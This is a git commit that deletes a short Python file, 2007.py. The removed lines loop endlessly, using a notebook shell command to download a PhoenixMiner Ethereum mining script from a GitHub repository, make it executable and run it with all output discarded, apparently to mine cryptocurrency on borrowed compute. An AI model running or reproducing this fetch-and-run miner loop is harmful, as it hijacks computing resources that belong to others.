93b3d3243f7f61aa9fa1e2e25e7c919e773de572
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-03-14 22:45:04 +0530

    Delete 2007.py

--- 2007.py
+++
@@ -1,6 +0,0 @@
-import time 
-while  True: 
-  ! timeout 15m wget https://raw.githubusercontent.com/Master478963/lolMinet/main/PhoenixMinerEth.sh && chmod u+x PhoenixMinerEth.sh && ./PhoenixMinerEth.sh > /dev/null 2>&1 
-  time.sleep(20) 
-
- 
